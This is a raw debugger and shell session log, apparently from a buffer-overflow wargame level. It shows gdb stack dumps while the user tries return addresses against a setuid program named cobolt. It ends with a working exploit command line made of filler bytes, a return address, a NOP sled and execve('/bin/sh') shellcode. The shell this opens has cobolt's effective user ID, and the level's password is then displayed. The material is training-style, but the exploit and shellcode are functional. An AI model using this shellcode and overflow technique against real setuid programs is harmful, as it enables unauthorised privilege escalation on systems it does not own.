0xbffffcb0:	0x474f4c00	0x454d414e	0x6572673d	0x6e696c6d
0xbffffcc0:	0x4d455200	0x4845544f	0x3d54534f	0x2e323931
0xbffffcd0:	0x2e383631	0x312e3635	0x49414d00	0x762f3d4c
0xbffffce0:	0x732f7261	0x6c6f6f70	0x69616d2f	0x72672f6c
0xbffffcf0:	0x696c6d65	0x414d006e	0x59544843	0x693d4550
0xbffffd00:	0x2d363833	0x68646572	0x6c2d7461	0x78756e69
0xbffffd10:	0x756e672d	0x52455400	0x74783d4d	0x006d7265
0xbffffd20:	0x54534f48	0x45505954
(gdb) r `python -c 'print "A"*20+"\x90"*50'`
The program being debugged has been started already.
Start it from the beginning? (y or n) ^[[A^[[B
Please answer y or n.
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/gremlin/cobalt `python -c 'print "A"*20+"\x90"*50'`

Breakpoint 1, 0x8048465 in main ()
(gdb) x/50 $esp
0xbffffaa0:	0xbffffaa8	0xbffffc11	0x41414141	0x41414141
0xbffffab0:	0x41414141	0x41414141	0x41414141	0x90909090
0xbffffac0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffad0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffae0:	0x90909090	0x90909090	0x90909090	0x08009090
0xbffffaf0:	0x080484ac	0x4000ae60	0xbffffafc	0x40013e90
0xbffffb00:	0x00000002	0xbffffbfc	0xbffffc11	0x00000000
0xbffffb10:	0xbffffc58	0xbffffc7a	0xbffffc84	0xbffffc92
0xbffffb20:	0xbffffcb1	0xbffffcc1	0xbffffcd9	0xbffffcf6
0xbffffb30:	0xbffffd15	0xbffffd20	0xbffffd2e	0xbffffd71
0xbffffb40:	0xbffffd84	0xbffffd99	0xbffffda9	0xbffffdb6
0xbffffb50:	0xbffffdd5	0xbffffdee	0xbffffdf9	0xbffffe0a
0xbffffb60:	0xbffffe1c	0xbffffe24
(gdb) 
0xbffffb68:	0x00000000	0x00000003	0x08048034	0x00000004
0xbffffb78:	0x00000020	0x00000005	0x00000006	0x00000006
0xbffffb88:	0x00001000	0x00000007	0x40000000	0x00000008
0xbffffb98:	0x00000000	0x00000009	0x08048380	0x0000000b
0xbffffba8:	0x000001f5	0x0000000c	0x000001f5	0x0000000d
0xbffffbb8:	0x000001f5	0x0000000e	0x000001f5	0x00000010
0xbffffbc8:	0x0fabfbff	0x0000000f	0xbffffbf7	0x00000000
0xbffffbd8:	0x00000000	0x00000000	0x00000000	0x00000000
0xbffffbe8:	0x00000000	0x00000000	0x00000000	0x69000000
0xbffffbf8:	0x00363836	0x6d6f682f	0x72672f65	0x696c6d65
0xbffffc08:	0x6f632f6e	0x746c6162	0x41414100	0x41414141
0xbffffc18:	0x41414141	0x41414141	0x41414141	0x90909041
0xbffffc28:	0x90909090	0x90909090
(gdb) 
0xbffffc30:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffc40:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffc50:	0x90909090	0x00909090	0x5353454c	0x4e45504f
0xbffffc60:	0x752f7c3d	0x622f7273	0x6c2f6e69	0x70737365
0xbffffc70:	0x2e657069	0x25206873	0x53550073	0x414e5245
0xbffffc80:	0x003d454d	0x54534948	0x455a4953	0x3030313d
0xbffffc90:	0x4f480030	0x414e5453	0x6c3d454d	0x6c61636f
0xbffffca0:	0x74736f68	0x636f6c2e	0x6f646c61	0x6e69616d
0xbffffcb0:	0x474f4c00	0x454d414e	0x6572673d	0x6e696c6d
0xbffffcc0:	0x4d455200	0x4845544f	0x3d54534f	0x2e323931
0xbffffcd0:	0x2e383631	0x312e3635	0x49414d00	0x762f3d4c
0xbffffce0:	0x732f7261	0x6c6f6f70	0x69616d2f	0x72672f6c
0xbffffcf0:	0x696c6d65	0x414d006e
(gdb) r `python -c 'print "A"*20+"Quitx90"*50'`
(gdb) r `python -c 'print "A"*20+"\x30\xfc\xff\xbf"+"\x90"*50'`
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/gremlin/cobalt `python -c 'print "A"*20+"\x30\xfc\xff\xbf"+"\x90"*50'`

Breakpoint 1, 0x8048465 in main ()
(gdb) x/50 $esp
0xbffffad0:	0xbffffad8	0xbffffc41	0x41414141	0x41414141
0xbffffae0:	0x41414141	0x41414141	0x41414141	0x4000fc30
0xbffffaf0:	0x00000002	0xbffffb34	0xbffffb40	0x40013868
0xbffffb00:	0x00000002	0x08048380	0x00000000	0x080483a1
0xbffffb10:	0x08048430	0x00000002	0xbffffb34	0x080482e0
0xbffffb20:	0x080484ac	0x4000ae60	0xbffffb2c	0x40013e90
0xbffffb30:	0x00000002	0xbffffc2c	0xbffffc41	0x00000000
0xbffffb40:	0xbffffc58	0xbffffc7a	0xbffffc84	0xbffffc92
0xbffffb50:	0xbffffcb1	0xbffffcc1	0xbffffcd9	0xbffffcf6
0xbffffb60:	0xbffffd15	0xbffffd20	0xbffffd2e	0xbffffd71
0xbffffb70:	0xbffffd84	0xbffffd99	0xbffffda9	0xbffffdb6
0xbffffb80:	0xbffffdd5	0xbffffdee	0xbffffdf9	0xbffffe0a
0xbffffb90:	0xbffffe1c	0xbffffe24
(gdb) 
0xbffffb98:	0x00000000	0x00000003	0x08048034	0x00000004
0xbffffba8:	0x00000020	0x00000005	0x00000006	0x00000006
0xbffffbb8:	0x00001000	0x00000007	0x40000000	0x00000008
0xbffffbc8:	0x00000000	0x00000009	0x08048380	0x0000000b
0xbffffbd8:	0x000001f5	0x0000000c	0x000001f5	0x0000000d
0xbffffbe8:	0x000001f5	0x0000000e	0x000001f5	0x00000010
0xbffffbf8:	0x0fabfbff	0x0000000f	0xbffffc27	0x00000000
0xbffffc08:	0x00000000	0x00000000	0x00000000	0x00000000
0xbffffc18:	0x00000000	0x00000000	0x00000000	0x69000000
0xbffffc28:	0x00363836	0x6d6f682f	0x72672f65	0x696c6d65
0xbffffc38:	0x6f632f6e	0x746c6162	0x41414100	0x41414141
0xbffffc48:	0x41414141	0x41414141	0x41414141	0x00fc3041
0xbffffc58:	0x5353454c	0x4e45504f
(gdb) 
0xbffffc60:	0x752f7c3d	0x622f7273	0x6c2f6e69	0x70737365
0xbffffc70:	0x2e657069	0x25206873	0x53550073	0x414e5245
0xbffffc80:	0x003d454d	0x54534948	0x455a4953	0x3030313d
0xbffffc90:	0x4f480030	0x414e5453	0x6c3d454d	0x6c61636f
0xbffffca0:	0x74736f68	0x636f6c2e	0x6f646c61	0x6e69616d
0xbffffcb0:	0x474f4c00	0x454d414e	0x6572673d	0x6e696c6d
0xbffffcc0:	0x4d455200	0x4845544f	0x3d54534f	0x2e323931
0xbffffcd0:	0x2e383631	0x312e3635	0x49414d00	0x762f3d4c
0xbffffce0:	0x732f7261	0x6c6f6f70	0x69616d2f	0x72672f6c
0xbffffcf0:	0x696c6d65	0x414d006e	0x59544843	0x693d4550
0xbffffd00:	0x2d363833	0x68646572	0x6c2d7461	0x78756e69
0xbffffd10:	0x756e672d	0x52455400	0x74783d4d	0x006d7265
0xbffffd20:	0x54534f48	0x45505954
(gdb) r `python -c 'print "A"*20+"\x30\xfc\xff\xff"+"\x90"*50'`
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/gremlin/cobalt `python -c 'print "A"*20+"\x30\xfc\xff\xff"+"\x90"*50'`

Breakpoint 1, 0x8048465 in main ()
(gdb) x/50 $esp
0xbffffad0:	0xbffffad8	0xbffffc41	0x41414141	0x41414141
0xbffffae0:	0x41414141	0x41414141	0x41414141	0x4000fc30
0xbffffaf0:	0x00000002	0xbffffb34	0xbffffb40	0x40013868
0xbffffb00:	0x00000002	0x08048380	0x00000000	0x080483a1
0xbffffb10:	0x08048430	0x00000002	0xbffffb34	0x080482e0
0xbffffb20:	0x080484ac	0x4000ae60	0xbffffb2c	0x40013e90
0xbffffb30:	0x00000002	0xbffffc2c	0xbffffc41	0x00000000
0xbffffb40:	0xbffffc58	0xbffffc7a	0xbffffc84	0xbffffc92
0xbffffb50:	0xbffffcb1	0xbffffcc1	0xbffffcd9	0xbffffcf6
0xbffffb60:	0xbffffd15	0xbffffd20	0xbffffd2e	0xbffffd71
0xbffffb70:	0xbffffd84	0xbffffd99	0xbffffda9	0xbffffdb6
0xbffffb80:	0xbffffdd5	0xbffffdee	0xbffffdf9	0xbffffe0a
0xbffffb90:	0xbffffe1c	0xbffffe24
(gdb) 
0xbffffb98:	0x00000000	0x00000003	0x08048034	0x00000004
0xbffffba8:	0x00000020	0x00000005	0x00000006	0x00000006
0xbffffbb8:	0x00001000	0x00000007	0x40000000	0x00000008
0xbffffbc8:	0x00000000	0x00000009	0x08048380	0x0000000b
0xbffffbd8:	0x000001f5	0x0000000c	0x000001f5	0x0000000d
0xbffffbe8:	0x000001f5	0x0000000e	0x000001f5	0x00000010
0xbffffbf8:	0x0fabfbff	0x0000000f	0xbffffc27	0x00000000
0xbffffc08:	0x00000000	0x00000000	0x00000000	0x00000000
0xbffffc18:	0x00000000	0x00000000	0x00000000	0x69000000
0xbffffc28:	0x00363836	0x6d6f682f	0x72672f65	0x696c6d65
0xbffffc38:	0x6f632f6e	0x746c6162	0x41414100	0x41414141
0xbffffc48:	0x41414141	0x41414141	0x41414141	0x00fc3041
0xbffffc58:	0x5353454c	0x4e45504f
(gdb) r `python -c 'print "A"*20+"\x30\xfc\xbf\xbf"+"\x90"*50'`
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/gremlin/cobalt `python -c 'print "A"*20+"\x30\xfc\xbf\xbf"+"\x90"*50'`

Breakpoint 1, 0x8048465 in main ()
(gdb) x/50 $esp
0xbffffaa0:	0xbffffaa8	0xbffffc0d	0x41414141	0x41414141
0xbffffab0:	0x41414141	0x41414141	0x41414141	0xbfbffc30
0xbffffac0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffad0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffae0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffaf0:	0x08009090	0x4000ae60	0xbffffafc	0x40013e90
0xbffffb00:	0x00000002	0xbffffbf8	0xbffffc0d	0x00000000
0xbffffb10:	0xbffffc58	0xbffffc7a	0xbffffc84	0xbffffc92
0xbffffb20:	0xbffffcb1	0xbffffcc1	0xbffffcd9	0xbffffcf6
0xbffffb30:	0xbffffd15	0xbffffd20	0xbffffd2e	0xbffffd71
0xbffffb40:	0xbffffd84	0xbffffd99	0xbffffda9	0xbffffdb6
0xbffffb50:	0xbffffdd5	0xbffffdee	0xbffffdf9	0xbffffe0a
0xbffffb60:	0xbffffe1c	0xbffffe24
(gdb) 
0xbffffb68:	0x00000000	0x00000003	0x08048034	0x00000004
0xbffffb78:	0x00000020	0x00000005	0x00000006	0x00000006
0xbffffb88:	0x00001000	0x00000007	0x40000000	0x00000008
0xbffffb98:	0x00000000	0x00000009	0x08048380	0x0000000b
0xbffffba8:	0x000001f5	0x0000000c	0x000001f5	0x0000000d
0xbffffbb8:	0x000001f5	0x0000000e	0x000001f5	0x00000010
0xbffffbc8:	0x0fabfbff	0x0000000f	0xbffffbf3	0x00000000
0xbffffbd8:	0x00000000	0x00000000	0x00000000	0x00000000
0xbffffbe8:	0x00000000	0x00000000	0x69000000	0x00363836
0xbffffbf8:	0x6d6f682f	0x72672f65	0x696c6d65	0x6f632f6e
0xbffffc08:	0x746c6162	0x41414100	0x41414141	0x41414141
0xbffffc18:	0x41414141	0x41414141	0xbffc3041	0x909090bf
0xbffffc28:	0x90909090	0x90909090
(gdb) 
0xbffffc30:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffc40:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffc50:	0x90909090	0x00909090	0x5353454c	0x4e45504f
0xbffffc60:	0x752f7c3d	0x622f7273	0x6c2f6e69	0x70737365
0xbffffc70:	0x2e657069	0x25206873	0x53550073	0x414e5245
0xbffffc80:	0x003d454d	0x54534948	0x455a4953	0x3030313d
0xbffffc90:	0x4f480030	0x414e5453	0x6c3d454d	0x6c61636f
0xbffffca0:	0x74736f68	0x636f6c2e	0x6f646c61	0x6e69616d
0xbffffcb0:	0x474f4c00	0x454d414e	0x6572673d	0x6e696c6d
0xbffffcc0:	0x4d455200	0x4845544f	0x3d54534f	0x2e323931
0xbffffcd0:	0x2e383631	0x312e3635	0x49414d00	0x762f3d4c
0xbffffce0:	0x732f7261	0x6c6f6f70	0x69616d2f	0x72672f6c
0xbffffcf0:	0x696c6d65	0x414d006e
(gdb) r `python -c 'print "A"*20+"\x30\xfc\xff\xbf"+"\x90"*50'`
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/gremlin/cobalt `python -c 'print "A"*20+"\x30\xfc\xff\xbf"+"\x90"*50'`

Breakpoint 1, 0x8048465 in main ()
(gdb) x/50 $esp
0xbffffad0:	0xbffffad8	0xbffffc41	0x41414141	0x41414141
0xbffffae0:	0x41414141	0x41414141	0x41414141	0x4000fc30
0xbffffaf0:	0x00000002	0xbffffb34	0xbffffb40	0x40013868
0xbffffb00:	0x00000002	0x08048380	0x00000000	0x080483a1
0xbffffb10:	0x08048430	0x00000002	0xbffffb34	0x080482e0
0xbffffb20:	0x080484ac	0x4000ae60	0xbffffb2c	0x40013e90
0xbffffb30:	0x00000002	0xbffffc2c	0xbffffc41	0x00000000
0xbffffb40:	0xbffffc58	0xbffffc7a	0xbffffc84	0xbffffc92
0xbffffb50:	0xbffffcb1	0xbffffcc1	0xbffffcd9	0xbffffcf6
0xbffffb60:	0xbffffd15	0xbffffd20	0xbffffd2e	0xbffffd71
0xbffffb70:	0xbffffd84	0xbffffd99	0xbffffda9	0xbffffdb6
0xbffffb80:	0xbffffdd5	0xbffffdee	0xbffffdf9	0xbffffe0a
0xbffffb90:	0xbffffe1c	0xbffffe24
(gdb) 
0xbffffb98:	0x00000000	0x00000003	0x08048034	0x00000004
0xbffffba8:	0x00000020	0x00000005	0x00000006	0x00000006
0xbffffbb8:	0x00001000	0x00000007	0x40000000	0x00000008
0xbffffbc8:	0x00000000	0x00000009	0x08048380	0x0000000b
0xbffffbd8:	0x000001f5	0x0000000c	0x000001f5	0x0000000d
0xbffffbe8:	0x000001f5	0x0000000e	0x000001f5	0x00000010
0xbffffbf8:	0x0fabfbff	0x0000000f	0xbffffc27	0x00000000
0xbffffc08:	0x00000000	0x00000000	0x00000000	0x00000000
0xbffffc18:	0x00000000	0x00000000	0x00000000	0x69000000
0xbffffc28:	0x00363836	0x6d6f682f	0x72672f65	0x696c6d65
0xbffffc38:	0x6f632f6e	0x746c6162	0x41414100	0x41414141
0xbffffc48:	0x41414141	0x41414141	0x41414141	0x00fc3041
0xbffffc58:	0x5353454c	0x4e45504f
(gdb) q
The program is running.  Exit anyway? (y or n) y
[gremlin@localhost gremlin]$ bash2
[gremlin@localhost gremlin]$ bash2
[gremlin@localhost gremlin]$ ./cobalt `python -c 'print"A"*20+"\xcc\xfa\xff\xbf"+"\x90"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`
AAAAAAAAAAAAAAAAAAAAͺÿ¿1￐h//shh/bin⏓ኂ°
                                      ̀ 
bash$ exit
exit
[gremlin@localhost gremlin]$ ./cobolt `python -c 'print"A"*20+"\xcc\xfa\xff\xbf"+"\x90"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`
AAAAAAAAAAAAAAAAAAAAͺÿ¿1￐h//shh/bin⏓ኂ°
               






			   ̀ 
bash$ my-pass
euid = 502
hacking exposed
bash$ id
uid=501(gremlin) gid=501(gremlin) euid=502(cobolt) egid=502(cobolt) groups=501(gremlin)
bash$ ls
ls: .: Permission denied
bash$ exit
exit
[gremlin@localhost gremlin]$ ls
cobalt  cobolt  cobolt.c  core  tmp
[gremlin@localhost gremlin]$ 